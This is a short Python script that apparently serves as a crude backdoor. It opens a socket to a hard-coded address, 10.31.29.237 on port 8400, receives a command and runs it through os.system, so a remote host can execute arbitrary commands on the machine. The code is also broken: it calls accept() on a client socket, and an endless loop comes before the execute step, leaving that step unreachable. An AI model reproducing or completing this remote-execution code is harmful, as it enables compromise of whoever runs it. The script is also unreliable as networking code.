import socket    
import os        
 
s = socket.socket()        

port = 8400 

s.connect(('10.31.29.237', port))
while True:
    c, addr = s.accept()
    print("Got connection from", addr)
    c.send("f100".encode())
    c.close()

command = s.recv(1024).decode()

os.system(command)

# close the connection
s.close() 